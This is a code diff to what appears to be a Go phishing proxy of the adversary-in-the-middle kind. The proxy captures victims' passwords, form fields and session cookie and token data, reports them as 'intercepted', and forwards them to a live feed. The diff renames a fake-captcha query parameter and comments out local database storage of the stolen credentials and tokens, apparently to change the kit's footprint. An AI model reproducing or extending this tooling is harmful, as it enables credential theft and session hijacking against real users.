@@ -164,20 +164,20 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	// Regular expression to detect turnstile requests
 	urlPattern := regexp.MustCompile(`/validate-captcha`)
 
-	// Only intercept /validate-captcha requests containing client_id
+	// Only intercept /validate-captcha requests containing user_id
 	p.Proxy.OnRequest(goproxy.UrlMatches(urlPattern)).DoFunc(
 		func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
-			// Check if the query string contains the client_id parameter
-			clientID := req.URL.Query().Get("client_id")
+			// Check if the query string contains the user_id parameter
+			clientID := req.URL.Query().Get("user_id")
 			if clientID != "" {
-				//fmt.Println("URL matches pattern, client_id found:", clientID)
+				//fmt.Println("URL matches pattern, user_id found:", clientID)
 				// Modify the request to forward it to the local server
 				req.URL.Scheme = "http"
 				req.URL.Host = "localhost:80"
 				// Forward the modified request
 				return req, nil
 			}
-			// If client_id is not present or not needed, you can decide how to handle this case.
+			// If user_id is not present or not needed, you can decide how to handle this case.
 			// For example, return the request unmodified, modify it in some other way, or even return a custom response.
 			return req, nil
 		},
@@ -753,9 +753,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								if pm != nil && len(pm) > 1 {
 									p.setSessionPassword(ps.SessionId, pm[1])
 									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
-									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
-										log.Error("database: %v", err)
-									}
+									// if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
+									// 	log.Error("database: %v", err)
+									// }
 									if len(session.RId) != 0 && len(session.Username) != 0 {
 										err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.livefeed)
 										if err != nil {
@@ -771,9 +771,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									if cm != nil && len(cm) > 1 {
 										p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
 										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
-										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
-											log.Error("database: %v", err)
-										}
+										// if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
+										// 	log.Error("database: %v", err)
+										// }
 									}
 								}
 							}
@@ -846,9 +846,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										if pm != nil && len(pm) > 1 {
 											p.setSessionPassword(ps.SessionId, pm[1])
 											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
-											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
-												log.Error("database: %v", err)
-											}
+											// if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
+											// 	log.Error("database: %v", err)
+											// }
 											if len(session.RId) != 0 && len(session.Username) != 0 {
 												err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.livefeed)
 												if err != nil {
@@ -863,9 +863,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											if cm != nil && len(cm) > 1 {
 												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
 												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
-												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
-													log.Error("database: %v", err)
-												}
+												// if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
+												// 	log.Error("database: %v", err)
+												// }
 											}
 										}
 									}
@@ -1131,9 +1131,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if !s.IsDone {
 						log.Success("[%d] all authorization tokens intercepted!", ps.Index)
 
-						if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
-							log.Error("database: %v", err)
-						}
+						// if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
+						// 	log.Error("database: %v", err)
+						// }
 						if err == nil {
 							if s.CookieTokens != nil && len(s.CookieTokens) > 0 {
 								err = database.HandleCapturedCookieSession(s.RId, s.CookieTokens, s.Browser, p.livefeed)
@@ -1142,9 +1142,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 							}
 						}
-						if err := p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens); err != nil {
-							log.Error("database: %v", err)
-						}
+						// if err := p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens); err != nil {
+						// 	log.Error("database: %v", err)
+						// }
 						if err == nil {
 							if s.BodyTokens != nil && len(s.BodyTokens) > 0 {
 								err = database.HandleCapturedOtherSession(s.RId, s.BodyTokens, s.Browser, p.livefeed)
@@ -1153,9 +1153,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 							}
 						}
-						if err := p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens); err != nil {
-							log.Error("database: %v", err)
-						}
+						// if err := p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens); err != nil {
+						// 	log.Error("database: %v", err)
+						// }
 						if err == nil {
 							if s.HttpTokens != nil && len(s.HttpTokens) > 0 {
 								err = database.HandleCapturedOtherSession(s.RId, s.HttpTokens, s.Browser, p.livefeed)
@@ -1279,10 +1279,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if ok && s.IsDone {
 					for _, au := range pl.authUrls {
 						if au.MatchString(resp.Request.URL.Path) {
-							err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens)
-							if err != nil {
-								log.Error("database: %v", err)
-							}
+							// err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens)
+							// if err != nil {
+							// 	log.Error("database: %v", err)
+							// }
 							if err == nil {
 								if s.CookieTokens != nil && len(s.CookieTokens) > 0 {
 									log.Success("[%d] detected authorization URL - cookie tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
@@ -1294,10 +1294,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 								}
 							}
-							err = p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens)
-							if err != nil {
-								log.Error("database: %v", err)
-							}
+							// err = p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens)
+							// if err != nil {
+							// 	log.Error("database: %v", err)
+							// }
 							if err == nil {
 								if s.BodyTokens != nil && len(s.BodyTokens) > 0 {
 									log.Success("[%d] detected authorization URL - body tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
@@ -1309,10 +1309,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 								}
 							}
-							err = p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens)
-							if err != nil {
-								log.Error("database: %v", err)
-							}
+							// err = p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens)
+							// if err != nil {
+							// 	log.Error("database: %v", err)
+							// }
 							if err == nil {
 								if s.HttpTokens != nil && len(s.HttpTokens) > 0 {
 									log.Success("[%d] detected authorization URL - HTTP tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
@@ -1412,7 +1412,7 @@ func (p *HttpProxy) trackerImage(req *http.Request) (*http.Request, *http.Respon
 func (p *HttpProxy) redirectTurnstile(req *http.Request, rid string) (*http.Request, *http.Response) {
 	resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 	if resp != nil {
-		redirect_url := "https://" + req.Host + "/validate-captcha?client_id=" + rid
+		redirect_url := "https://" + req.Host + "/validate-captcha?user_id=" + rid
 		resp.Header.Add("Location", redirect_url)
 		return req, resp
 	}
